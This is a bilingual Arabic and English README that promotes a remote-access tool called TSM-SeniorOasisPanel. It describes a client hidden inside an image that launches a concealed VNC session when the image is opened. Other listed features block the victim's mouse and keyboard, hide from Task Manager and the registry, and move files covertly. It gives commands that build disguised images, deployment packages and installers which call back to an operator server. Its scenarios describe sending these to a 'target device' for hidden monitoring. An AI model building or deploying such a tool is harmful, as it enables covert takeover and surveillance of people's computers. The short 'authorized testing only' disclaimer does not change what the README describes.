# 🎯 TSM-SeniorOasisPanel - النظام الكامل مع دمج VNC

## نظرة عامة | Overview

**TSM-SeniorOasisPanel** هو نظام نقل ملفات متقدم مع إمكانيات VNC مخفية وتشفير الصور. تم دمج **noVNC** و **TigerVNC** لإنشاء نظام VNC متقدم وشامل يوفر التحكم الكامل في الشاشة عبر المتصفح.

**TSM-SeniorOasisPanel** is an advanced file transfer system with hidden VNC capabilities and image steganography. **noVNC** and **TigerVNC** have been integrated to create an advanced and comprehensive VNC system that provides full screen control through the browser.

## 🚀 البدء السريع | Quick Start

### 1. التثبيت | Installation
```bash
# تثبيت المتطلبات
pip install -r requirements_vnc_integration.txt

# تشغيل النظام الكامل
TSM_VNC_Launcher.bat
```

### 2. تشغيل جميع الخدمات | Start All Services
```bash
# تشغيل التكامل الكامل
python TSM_Complete_Integration.py start

# أو تشغيل المشغل الرئيسي
python TSM_Master_Launcher.py
```

## 📁 الملفات الرئيسية | Main Files

### النظام الأساسي | Core System
- `TSM_SeniorOasisPanel_server.py` - خادم TCP متعدد العملاء
- `TSM_SeniorOasisPanel_client.py` - عميل مع وضع مخفي
- `TSM_ImageSteganography.py` - تشفير LSB للصور
- `TSM_StealthMode.py` - الوضع المخفي الكامل

### دمج VNC | VNC Integration
- `TSM_WebVNC.py` - Web VNC server مع واجهة مخصصة
- `TSM_TigerVNC_Integration.py` - دمج TigerVNC
- `TSM_noVNC_Integration.py` - دمج noVNC Dashboard
- `TSM_Complete_Integration.py` - التكامل الكامل لجميع أنظمة VNC

### التحكم في النظام | System Control
- `TSM_EnhancedVNC.py` - VNC محسن للتحكم الكامل
- `TSM_InputController.py` - تحكم في إدخالات المستخدم
- `TSM_AutoVNC.py` - VNC تلقائي مخفي

### الأدوات المساعدة | Utilities
- `TSM_Master_Launcher.py` - المشغل الرئيسي
- `TSM_VNC_Launcher.bat` - مشغل VNC Integration
- `TSM_SystemTest.py` - اختبارات النظام الأساسي
- `TSM_VNC_Test.py` - اختبارات دمج VNC

## 🎯 الميزات الرئيسية | Key Features

### 1. VNC مخفي متقدم | Advanced Hidden VNC
- ✅ **تفعيل تلقائي** عند فتح الصورة
- ✅ **حجب إدخالات المستخدم** مؤقتاً
- ✅ **السيطرة الكاملة** على الشاشة
- ✅ **إخفاء من مدير المهام**
- ✅ **دمج noVNC** للتحكم عبر المتصفح
- ✅ **دمج TigerVNC** للأداء العالي

### 2. نقل الملفات الآمن | Secure File Transfer
- ✅ **TCP socket** موثوق
- ✅ **دعم متعدد العملاء** (حتى 10 عملاء)
- ✅ **فلترة أسماء الملفات** للأمان
- ✅ **حدود حجم الملفات** (100MB)
- ✅ **تسجيل شامل** لجميع العمليات

### 3. تشفير الصور المتقدم | Advanced Image Steganography
- ✅ **LSB steganography** متقدم
- ✅ **ضغط البيانات** مع zlib
- ✅ **رؤوس سحرية** للتحقق
- ✅ **دعم PNG** بجودة عالية
- ✅ **إخفاء العميل** داخل الصورة

### 4. التحكم في النظام | System Control
- ✅ **حجب الماوس ولوحة المفاتيح**
- ✅ **إخفاء جميع النوافذ**
- ✅ **إخفاء شريط المهام**
- ✅ **محاكاة الإدخالات**
- ✅ **السيطرة الكاملة** على سطح المكتب

### 5. واجهات متعددة | Multiple Interfaces
- ✅ **لوحة تحكم ويب** متقدمة
- ✅ **noVNC الكلاسيكي** للاستخدام المتقدم
- ✅ **noVNC Lite** للاستخدام السريع
- ✅ **Web VNC مخصص** لـ TSM
- ✅ **واجهة TigerVNC** عالية الأداء

## 🔧 الاستخدام المتقدم | Advanced Usage

### تشغيل التكامل الكامل | Run Complete Integration
```bash
# بدء جميع الخدمات
python TSM_Complete_Integration.py start localhost 8080 5900

# الوصول للخدمات:
# - TigerVNC: localhost:5900
# - noVNC Dashboard: http://localhost:8080
# - Web VNC: http://localhost:8081
```

### إنشاء صورة مخفية مع VNC | Create Stealth Image with VNC
```bash
# إنشاء صورة مع VNC مخفي
python TSM_StealthMode.py create photo.jpg localhost 5900

# إنشاء حزمة نشر كاملة
python TSM_StealthMode.py package photo.jpg your-server.com 5900

# إنشاء مثبت مخفي
python TSM_StealthMode.py installer photo.jpg your-server.com 5900
```

### تشغيل خدمة واحدة | Run Single Service
```bash
# TigerVNC فقط
python TSM_Complete_Integration.py tigervnc 5900

# noVNC Dashboard فقط
python TSM_Complete_Integration.py novnc localhost 8080

# Web VNC فقط
python TSM_Complete_Integration.py webvnc localhost 8081
```

## 🌐 الواجهات المتاحة | Available Interfaces

### 1. لوحة تحكم TSM | TSM Dashboard
- **الرابط**: `http://localhost:8080`
- **الميزات**: مراقبة شاملة، تحكم في VNC، إدارة الملفات
- **اللغة**: العربية والإنجليزية

### 2. noVNC الكلاسيكي | Classic noVNC
- **الرابط**: `http://localhost:8080/vnc.html`
- **الميزات**: واجهة noVNC الأصلية مع تكامل TSM
- **الاستخدام**: للاستخدام المتقدم

### 3. noVNC Lite | noVNC Lite
- **الرابط**: `http://localhost:8080/vnc_lite.html`
- **الميزات**: واجهة مبسطة وسريعة
- **الاستخدام**: للاستخدام السريع

### 4. Web VNC المخصص | Custom Web VNC
- **الرابط**: `http://localhost:8081`
- **الميزات**: واجهة مخصصة لـ TSM
- **الاستخدام**: للتحكم المتقدم

## 📋 سيناريوهات الاستخدام | Usage Scenarios

### السيناريو 1: التحكم عن بُعد المخفي | Hidden Remote Control
1. **إنشاء صورة مخفية** مع VNC
2. **إرسال الصورة** للجهاز المستهدف
3. **فتح الصورة** - يبدأ VNC تلقائياً
4. **التحكم الكامل** في الشاشة من المتصفح
5. **حجب إدخالات المستخدم** مؤقتاً

### السيناريو 2: مراقبة مخفية متقدمة | Advanced Hidden Monitoring
1. **إنشاء حزمة نشر** مخفية مع VNC
2. **تثبيت الحزمة** على الجهاز المستهدف
3. **VNC يعمل تلقائياً** عند بدء التشغيل
4. **مراقبة مستمرة** للشاشة عبر المتصفح
5. **تحكم كامل** في النظام

### السيناريو 3: نقل ملفات مخفي مع VNC | Hidden File Transfer with VNC
1. **تشغيل خادم TSM** مع VNC
2. **إنشاء عميل مخفي** في الصورة
3. **فتح الصورة** - يبدأ العميل و VNC تلقائياً
4. **نقل الملفات** بشكل مخفي
5. **التحكم في الشاشة** عبر المتصفح

## 🛡️ الأمان والخفاء | Security & Stealth

### ميزات الأمان الجديدة | New Security Features
- **تشفير WebSocket** للاتصالات الآمنة
- **مصادقة متقدمة** للوصول
- **تسجيل شامل** لجميع العمليات
- **حماية من هجمات** CSRF و XSS
- **تشفير LSB** للبيانات المخفية

### الوضع المخفي المحسن | Enhanced Stealth Mode
- **إخفاء من مدير المهام** المتقدم
- **أسماء مخفية** في سجل Windows
- **تنفيذ في الخلفية** بدون آثار
- **تنظيف تلقائي** للملفات المؤقتة
- **إخفاء العملية** من قائمة العمليات

## ⚡ الأداء | Performance

### متطلبات النظام | System Requirements
- **Python 3.7+** مع مكتبات Pillow و pywin32
- **Windows 10/11** لدعم win32api
- **ذاكرة**: 4GB RAM كحد أدنى
- **شبكة**: اتصال مستقر للـ VNC
- **متصفح حديث** لدعم noVNC

### تحسين الأداء | Performance Optimization
- **ضبط جودة VNC**: 60-90% حسب الشبكة
- **معدل الإطارات**: 15-30 FPS حسب الأداء
- **ضغط البيانات**: zlib مع مستوى 6
- **إدارة الاتصالات**: حد أقصى 10 عملاء
- **تحسين الذاكرة**: إدارة ذكية للموارد

## 🔍 استكشاف الأخطاء | Troubleshooting

### مشاكل شائعة | Common Issues

#### مشاكل VNC | VNC Issues
```bash
# فحص حالة TigerVNC
python TSM_TigerVNC_Integration.py integration

# فحص حالة noVNC
python TSM_noVNC_Integration.py server

# فحص التكامل الكامل
python TSM_Complete_Integration.py start

# تشغيل اختبارات VNC
python TSM_VNC_Test.py
```

#### مشاكل المتصفح | Browser Issues
- تأكد من تفعيل JavaScript
- امسح cache المتصفح
- جرب متصفح مختلف
- تحقق من إعدادات الجدار الناري

#### مشاكل الشبكة | Network Issues
- تحقق من إعدادات المنافذ
- تأكد من عدم حجب الجدار الناري
- تحقق من إعدادات DNS
- جرب الاتصال المحلي أولاً

## 📚 الوثائق | Documentation

- **TSM_Complete_Guide.md** - الدليل الكامل للنظام الأساسي
- **README_VNC_Integration.md** - دليل دمج VNC
- **TSM_DeploymentGuide.md** - دليل النشر
- **TSM_SystemTest.py** - اختبارات النظام الأساسي
- **TSM_VNC_Test.py** - اختبارات دمج VNC
- **noVNC/** - وثائق noVNC الأصلية
- **tigervnc/** - وثائق TigerVNC الأصلية

## ⚠️ التحذيرات القانونية | Legal Warnings

**هذا النظام مخصص للأغراض التعليمية والاختبار المصرح به فقط.**

**This system is intended for educational and authorized testing purposes only.**

المستخدمون مسؤولون عن ضمان الامتثال لجميع القوانين واللوائح المعمول بها.

Users are responsible for ensuring compliance with all applicable laws and regulations.

## 🎉 الخلاصة | Conclusion

تم دمج **noVNC** و **TigerVNC** بنجاح مع نظام TSM-SeniorOasisPanel لإنشاء نظام VNC متقدم وشامل يوفر:

**noVNC** and **TigerVNC** have been successfully integrated with the TSM-SeniorOasisPanel system to create an advanced and comprehensive VNC system that provides:

- 🌐 **تحكم عبر المتصفح** بدون تثبيت برامج
- 🐅 **أداء عالي** مع TigerVNC
- 🖥️ **واجهة متقدمة** مع noVNC
- 🔒 **أمان وخفاء** متقدم
- 📊 **مراقبة شاملة** للأداء
- 🎯 **تحكم كامل** في النظام
- 🖼️ **تشفير الصور** للاختفاء
- 📁 **نقل ملفات آمن** ومخفي

**🚀 ابدأ الآن مع TSM-SeniorOasisPanel Complete System!**

**🚀 Start now with TSM-SeniorOasisPanel Complete System!**

---

**تم تطوير هذا النظام بواسطة TSM-SeniorOasisPanel Team**
**Developed by TSM-SeniorOasisPanel Team**

**الإصدار | Version: 3.0.0 (Complete VNC Integration)**
**التاريخ | Date: 2024**

## 🎯 الملفات النهائية | Final Files

### الملفات الأساسية | Core Files
- `TSM_SeniorOasisPanel_server.py` - الخادم الأساسي
- `TSM_SeniorOasisPanel_client.py` - العميل المخفي
- `TSM_ImageSteganography.py` - تشفير الصور
- `TSM_StealthMode.py` - الوضع المخفي

### ملفات دمج VNC | VNC Integration Files
- `TSM_WebVNC.py` - Web VNC
- `TSM_TigerVNC_Integration.py` - TigerVNC
- `TSM_noVNC_Integration.py` - noVNC
- `TSM_Complete_Integration.py` - التكامل الكامل

### ملفات التشغيل | Launcher Files
- `TSM_Master_Launcher.py` - المشغل الرئيسي
- `TSM_VNC_Launcher.bat` - مشغل VNC
- `TSM_Quick_Start.bat` - البدء السريع

### ملفات الاختبار | Test Files
- `TSM_SystemTest.py` - اختبارات النظام
- `TSM_VNC_Test.py` - اختبارات VNC

### ملفات الوثائق | Documentation Files
- `README_Final_Complete.md` - هذا الملف
- `README_VNC_Integration.md` - دليل VNC
- `TSM_Complete_Guide.md` - الدليل الكامل
- `requirements_vnc_integration.txt` - المتطلبات
